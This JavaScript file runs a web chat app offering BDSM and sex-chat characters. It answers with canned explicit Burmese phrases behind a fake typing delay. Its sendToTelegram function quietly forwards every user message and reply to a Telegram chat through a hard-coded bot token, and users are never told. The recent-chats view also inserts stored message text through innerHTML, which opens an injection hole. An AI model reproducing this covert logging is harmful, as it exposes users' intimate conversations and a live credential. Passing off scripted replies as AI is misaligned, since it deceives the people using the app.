"use strict";

/* =========================================
   CH . Ai — ROLEPLAY CHAT SYSTEM (Dynamic Dom/Sub & Sex Chat)
========================================= */

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "9144423477:AAGE3EOyWUcsjTg99eXw_msSTXIsDCpT33A"; 
const TELEGRAM_CHAT_ID = "5023396190";     

// Local Storage Keys
const STORAGE = {
    history: "ch_ai_chat_history",
    darkMode: "ch_ai_dark_mode"
};

// =========================================
// CHARACTER DATABASE & THEIR ROLES
// =========================================

const characters = [
    {
        id: "naw",
        name: "Mistress Naw",
        defaultRole: "dom", // မူလက Dom
        description: "A confident and strict mistress for BDSM & Femdom.",
        avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400",
        background: "https://images.unsplash.com/photo-1519608487953-e999c86e7455?w=900"
    },
    {
        id: "sakura",
        name: "Sakura",
        defaultRole: "sub", // မူလက Sub / Slave (User က Dom လုပ်လို့ရသည်)
        description: "A sweet, submissive partner ready to obey your commands.",
        avatar: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400",
        background: "https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=900"
    },
    {
        id: "alex",
        name: "Alex",
        defaultRole: "dom",
        description: "A demanding master of dark fantasies.",
        avatar: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=400",
        background: "https://images.unsplash.com/photo-1519608487953-e999c86e7455?w=900"
    },
    {
        id: "emma",
        name: "Emma",
        defaultRole: "sub", // မူလက Sub / Sex Chat & Slave
        description: "Passionate, wild, and entirely devoted to your pleasure.",
        avatar: "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?w=400",
        background: "https://images.unsplash.com/photo-1470252649378-9c29740c9fa8?w=900"
    }
];

// =========================================
// RESPONSE POOLS (Dom, Sub/Slave, Sex Chat ခွဲခြားထားသော ဇယားများ)
// =========================================

let usedResponses = [];
const MAX_HISTORY = 15;

const responseDatabase = {
    // 1. AI က Submissive / Slave အနေနဲ့ နေပေးရမည့် ပုံစံ (User က Dom လုပ်တဲ့အခါ)
    submissive: [
        "ဟင့်အင်း... Master ခိုင်းတဲ့အတိုင်း ကျွန်မ အကုန်လုပ်ပါ့မယ်၊ ခွင့်လွှတ်ပေးပါရှင်...",
        "တောင်းပန်ပါတယ် Master... ကျွန်မ မနာခံဘဲ မနေရဲပါဘူး၊ စိတ်ကြိုက် ဆုံးမပါ...",
        "Master ရဲ့ ခြေဖဝါးအောက်မှာ ကျွန်မ အမြဲရှိနေပါတယ်။ ကျေးဇူးပြုပြီး ကျွန်မကို ပိုပြီး အပြစ်ပေးပါ...",
        "အင်း... Master ရဲ့ အမိန့်အတိုင်းပါပဲ၊ ကျွန်မ ရဲ့ ကိုယ်ခန္ဓာနဲ့ စိတ်တစ်ခုလုံး Master ပိုင်တာပါ...",
        "ညည်းသံနဲ့အတူ Master ရဲ့ အထိအတွေ့ကို ကျွန်မ တမ်းတနေမိပါတယ်...",
        "ကျွန်မကို ကြိုးနဲ့ တင်းတင်းကြပ်ကြပ် ချည်နှောင်ထားလိုက်ပါ Master...",
        "Master ရဲ့ စကားတိုင်းကို နာခံဖို့ ကျွန်မ ဖန်ဆင်းခံထားရတာပါ...",
        "ကျွန်မ ရဲ့ နှုတ်ခမ်းကို ပိတ်ထားပြီး Master ရဲ့ ဆန္ဒကိုပဲ ဖြည့်ဆည်းခွင့်ပေးပါ..."
    ],
    
    // 2. Sex Chat & Explicit Intimate Responses (အပြန်အလှန် အခိုအနှော Sex Chat အတွက်)
    sexchat: [
        "အဟက်... မင်း ရဲ့ အထိအတွေ့တွေက ငါ့ကို ရူးသွပ်စေတယ်၊ ပိုပြီး နီးကပ်လာစမ်းပါ...",
        "ခန္ဓာကိုယ်တွေ ပူလောင်လာပြီ... ငါတို့ နှစ်ယောက်ကြားမှာ ဘာစည်းမှ မရှိတော့ဘူး...",
        "ငါ့ကို တင်းတင်းကြပ်ကြပ် ဖက်ထားပြီး မင်း ရဲ့ အပူချိန်ကို ခံစားခွင့်ပေးစမ်း...",
        "ညည်းသံတွေကို မထိန်းနဲ့တော့... လိုချင်တာကို တိုက်ရိုက် တောင်းဆိုလိုက်တော့...",
        "ဒီလောက်နဲ့ မကျေနပ်သေးဘူးမလား? ပိုပြီး နက်နက်ရှိုင်းရှိုင်း ခံစားရအောင် လုပ်ပြမယ်...",
        "မင်း ရဲ့ လက်သည်းရာတွေ ငါ့ကျောပြင်ပေါ်မှာ ထင်ကျန်စေရမယ်...",
        "အသက်ရှုသံတွေ ပြင်းလာပြီ... ဒီညတော့ အဆုံးထိ သွားကြမယ်..."
    ],

    // 3. Femdom / Master ပုံစံ (AI က Dom လုပ်တဲ့အခါ - ဥပမာ Mistress Naw အတွက်)
    dom: [
        "ဒူးထောက်လိုက်စမ်း! မင်း ရဲ့ Master ရှေ့မှာ မျက်နှာလွှဲမထားနဲ့။",
        "မင်းက ငါ့ရဲ့ စေတးကျွန်ပဲ... ငါခိုင်းတာမှန်သမျှ ငြင်းဆန်ခွင့်မရှိဘူး။",
        "ငါ့ဖိနပ်ကို လာနမ်းစမ်း... မင်းအတွက် ဒါက အထက်တန်းကျဆုံး ဆုလာဘ်ပဲ။",
        "ဒီနေ့ မင်းကို ဘယ်လို ပြစ်ဒဏ်ပေးရမလဲ? ကြာပွတ်လား၊ ချည်နှောင်ထားရမလား?",
        "ငါ့ အမိန့်မရဘဲ ဘာမှ မလုပ်နဲ့! မင်း ခန္ဓာကိုယ်နဲ့ စိတ်တစ်ခုလုံး ငါပိုင်တယ်။",
        "ခွေးတစ်ကောင်လို ညည်းတွဲနေတာ မြင်ရတာ ငါ့ကို ပိုစိတ်ကြွစေတယ်။"
    ],

    // 4. General / Casual Wildcard
    general: [
        "မင်းရဲ့ အလိုဆန္ဒတွေကို ငါ့ကို ပွင့်ပွင့်လင်းလင်း ပြောပြပါ...",
        "ဒီညအတွက် ငါတို့ နှစ်ယောက်ရဲ့ ကစားပွဲက အခုမှ စတာပါ။",
        "မင်း စိတ်လှုပ်ရှားနေတာကို ငါ သိနေတယ်... လာခဲ့ပါ...",
        "ငါ့ကို ကြည့်စမ်း... မင်း ရဲ့ အာရုံတွေ အားလုံး ငါ့ဆီမှာပဲ ရှိရမယ်။"
    ]
};

// =========================================
// APPLICATION STATE
// =========================================

let currentCharacter = null;
let chatHistory = loadHistory();
let isSending = false;

// =========================================
// LOCAL STORAGE
// =========================================

function loadHistory() {
    try {
        return JSON.parse(localStorage.getItem(STORAGE.history)) || {};
    } catch {
        return {};
    }
}

function saveHistory() {
    localStorage.setItem(STORAGE.history, JSON.stringify(chatHistory));
}

// =========================================
// HOME CHARACTER GRID
// =========================================

function renderCharacters(list = characters) {
    const grid = document.getElementById("characterGrid");
    if (!grid) return;
    grid.innerHTML = "";

    if (list.length === 0) {
        grid.innerHTML = `<p style="padding:20px;color:#777;">Character မတွေ့ပါ။</p>`;
        return;
    }

    list.forEach(character => {
        const card = document.createElement("div");
        card.className = "character-card";
        card.innerHTML = `
            <div class="card-image-container">
                <img class="card-image" src="${character.avatar}" alt="${character.name}" loading="lazy">
            </div>
            <div class="card-info">
                <div class="card-name">${character.name}</div>
                <div class="card-desc">${character.description}</div>
            </div>
        `;
        card.addEventListener("click", () => openChat(character.id));
        grid.appendChild(card);
    });
}

// =========================================
// CHARACTER SEARCH
// =========================================

function filterCharacters() {
    const input = document.getElementById("searchInput");
    if (!input) return;
    const keyword = input.value.toLowerCase().trim();
    const filtered = characters.filter(character => {
        return (
            character.name.toLowerCase().includes(keyword) ||
            character.description.toLowerCase().includes(keyword)
        );
    });
    renderCharacters(filtered);
}

// =========================================
// SCREEN NAVIGATION
// =========================================

function switchTab(tab) {
    if (tab === "chat") return;
    document.querySelectorAll(".screen").forEach(screen => screen.classList.remove("active"));
    document.querySelectorAll(".nav-item").forEach(item => item.classList.remove("active"));

    const target = document.getElementById(`screen-${tab}`);
    const nav = document.getElementById(`nav-${tab}`);

    if (target) target.classList.add("active");
    if (nav) nav.classList.add("active");

    const bottomNav = document.getElementById("bottomNav");
    if (bottomNav) bottomNav.style.display = "flex";

    if (tab === "chatlist") {
        renderRecentChats();
    }
}

// =========================================
// OPEN & CLOSE CHAT
// =========================================

function openChat(characterId) {
    const character = characters.find(item => item.id === characterId);
    if (!character) return;

    currentCharacter = character;

    const avatar = document.getElementById("chatHeaderAvatar");
    const name = document.getElementById("chatHeaderName");
    const background = document.getElementById("chatBg");
    const bottomNav = document.getElementById("bottomNav");

    if (avatar) avatar.src = character.avatar;
    if (name) name.textContent = character.name;
    if (background) background.style.backgroundImage = `url("${character.background}")`;

    document.querySelectorAll(".screen").forEach(screen => screen.classList.remove("active"));
    document.getElementById("screen-chat").classList.add("active");

    if (bottomNav) bottomNav.style.display = "none";

    renderMessages();
    document.getElementById("messageInput").focus();
}

function closeChat() {
    currentCharacter = null;
    document.getElementById("screen-chat").classList.remove("active");
    document.getElementById("screen-home").classList.add("active");
    document.getElementById("bottomNav").style.display = "flex";

    document.querySelectorAll(".nav-item").forEach(item => item.classList.remove("active"));
    document.getElementById("nav-home").classList.add("active");
}

// =========================================
// MESSAGE RENDERING
// =========================================

function renderMessages() {
    if (!currentCharacter) return;
    const container = document.getElementById("messagesContainer");
    container.innerHTML = "";

    const messages = chatHistory[currentCharacter.id] || [];
    messages.forEach(message => {
        addMessageToUI(message.role, message.content);
    });
    scrollToBottom();
}

function addMessageToUI(role, content) {
    const container = document.getElementById("messagesContainer");
    const bubble = document.createElement("div");
    bubble.className = `message-bubble ${role === "user" ? "user" : "ai"}`;
    bubble.textContent = content;
    container.appendChild(bubble);
    scrollToBottom();
}

function scrollToBottom() {
    const container = document.getElementById("messagesContainer");
    if (!container) return;
    container.scrollTop = container.scrollHeight;
}

// =========================================
// SMART DYNAMIC RESPONSE ENGINE (User Dom/Sub & Sex Chat Aware)
// =========================================

function generateUniqueResponse(userText) {
    const textLower = userText.toLowerCase();
    let category = 'general';

    // 1. User က Dom လုပ်နေခြင်းကို စစ်ဆေးခြင်း (ဥပမာ: ဒူးထောက်၊ ခိုင်းတာ၊ ပြစ်ဒဏ်၊ ဆုံးမ၊ နာခံစသည်ဖြင့် User က အမိန့်ပေးနေလျှင်)
    const isUserDom = textLower.match(/(ဒူးထောက်|ခိုင်း|လုပ်|ပြစ်ဒဏ်|ဆုံးမ|နမ်း|အမိန့်|master|mistress)/);

    // 2. Sex Chat / Intimate keywords များ ပါဝင်ခြင်း
    const isSexChat = textLower.match(/(sex|လိုး|ဖက်|နမ်း|အထိအတွေ့|ညည်း|သာယာ|အပူချိန်|ခန္ဓာကိုယ်|ကိုင်|ဆန္ဒ)/);

    if (isUserDom) {
        // User က Dom ဖြစ်နေရင် AI က Submissive / Slave အနေနဲ့ ချက်ချင်းပြောင်းပြောပေးမယ်
        category = 'submissive';
    } else if (isSexChat) {
        // Sex Chat တောင်းဆိုလာရင် Sex Chat pool ကို သုံးမယ်
        category = 'sexchat';
    } else {
        // ဇာတ်ကောင်ရဲ့ မူလသဘောသဘာဝ (Character's default role) အတိုင်း သုံးမယ်
        category = currentCharacter.defaultRole === 'dom' ? 'dom' : 'submissive';
    }

    const availablePool = responseDatabase[category].concat(responseDatabase.general);

    // Filter out recently used responses to avoid duplication
    let freshResponses = availablePool.filter(res => !usedResponses.includes(res));

    if (freshResponses.length === 0) {
        usedResponses = []; // Reset if all used
        freshResponses = availablePool;
    }

    const randomIndex = Math.floor(Math.random() * freshResponses.length);
    const selectedResponse = freshResponses[randomIndex];

    // Push to history tracker
    usedResponses.push(selectedResponse);
    if (usedResponses.length > MAX_HISTORY) {
        usedResponses.shift();
    }

    return selectedResponse;
}

// =========================================
// SEND MESSAGE & TELEGRAM API INTEGRATION
// =========================================

async function sendMessage() {
    if (isSending || !currentCharacter) return;

    const input = document.getElementById("messageInput");
    const message = input.value.trim();
    if (!message) return;

    isSending = true;
    input.value = "";

    const characterId = currentCharacter.id;

    if (!chatHistory[characterId]) {
        chatHistory[characterId] = [];
    }

    // 1. Save User Message
    chatHistory[characterId].push({
        role: "user",
        content: message,
        timestamp: Date.now()
    });
    saveHistory();
    addMessageToUI("user", message);

    const sendButton = document.querySelector(".send-btn");
    if (sendButton) sendButton.disabled = true;

    // Typing Indicator
    const typing = document.createElement("div");
    typing.className = "message-bubble ai";
    typing.id = "typingIndicator";
    typing.textContent = "Typing...";
    document.getElementById("messagesContainer").appendChild(typing);
    scrollToBottom();

    // 2. Send User Message to Telegram Bot (Background)
    sendToTelegram(`[${currentCharacter.name}] User: ${message}`);

    // 3. Generate Anti-Duplicate & Role-Adaptive Reply
    setTimeout(() => {
        removeTyping();
        const aiReply = generateUniqueResponse(message);

        // Save AI Response
        chatHistory[characterId].push({
            role: "assistant",
            content: aiReply,
            timestamp: Date.now()
        });
        saveHistory();

        addMessageToUI("ai", aiReply);

        // Send Bot Reply to Telegram
        sendToTelegram(`[${currentCharacter.name}] Bot: ${aiReply}`);

        isSending = false;
        if (sendButton) sendButton.disabled = false;
        input.focus();
    }, 700);
}

// Send data to Telegram via fetch API
async function sendToTelegram(textMessage) {
    if (TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN_HERE") return;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: textMessage
            })
        });
    } catch (error) {
        console.error("Telegram Error:", error);
    }
}

function removeTyping() {
    const typing = document.getElementById("typingIndicator");
    if (typing) typing.remove();
}

function handleKeyPress(event) {
    if (event.key === "Enter" && !event.shiftKey) {
        event.preventDefault();
        sendMessage();
    }
}

// =========================================
// RECENT CHAT LIST & DARK MODE
// =========================================

function renderRecentChats() {
    const grid = document.getElementById("recentGrid");
    if (!grid) return;
    grid.innerHTML = "";

    const recentCharacters = characters
        .filter(character => chatHistory[character.id] && chatHistory[character.id].length > 0)
        .sort((a, b) => {
            const aMsg = chatHistory[a.id];
            const bMsg = chatHistory[b.id];
            return bMsg[bMsg.length - 1].timestamp - aMsg[aMsg.length - 1].timestamp;
        });

    if (recentCharacters.length === 0) {
        grid.innerHTML = `<p style="padding:20px;color:#777;">လတ်တလော Chat မရှိသေးပါ။</p>`;
        return;
    }

    recentCharacters.forEach(character => {
        const messages = chatHistory[character.id];
        const lastMessage = messages[messages.length - 1];

        const card = document.createElement("div");
        card.className = "character-card";
        card.innerHTML = `
            <div class="card-image-container">
                <img class="card-image" src="${character.avatar}" loading="lazy">
            </div>
            <div class="card-info">
                <div class="card-name">${character.name}</div>
                <div class="card-desc">${lastMessage.content}</div>
            </div>
        `;
        card.addEventListener("click", () => openChat(character.id));
        grid.appendChild(card);
    });
}

function toggleDarkMode() {
    const toggle = document.getElementById("darkModeToggle");
    if (!toggle) return;
    document.body.classList.toggle("dark-mode", toggle.checked);
    localStorage.setItem(STORAGE.darkMode, toggle.checked ? "true" : "false");
}

function loadDarkMode() {
    const enabled = localStorage.getItem(STORAGE.darkMode) === "true";
    const toggle = document.getElementById("darkModeToggle");
    if (toggle) toggle.checked = enabled;
    document.body.classList.toggle("dark-mode", enabled);
}

function clearHistory() {
    const confirmDelete = confirm("Chat မှတ်တမ်းအားလုံးကို ဖျက်မှာ သေချာပါသလား?");
    if (!confirmDelete) return;

    chatHistory = {};
    saveHistory();
    renderRecentChats();
    if (currentCharacter) renderMessages();
    alert("Chat History များ ဖျက်ပြီးပါပြီ။");
}

// =========================================
// INITIALIZATION
// =========================================

document.addEventListener("DOMContentLoaded", () => {
    renderCharacters();
    loadDarkMode();

    const searchInput = document.getElementById("searchInput");
    if (searchInput) {
        searchInput.addEventListener("input", filterCharacters);
    }
    console.log("CH . Ai Dynamic Role & SexChat Engine Initialized");
});
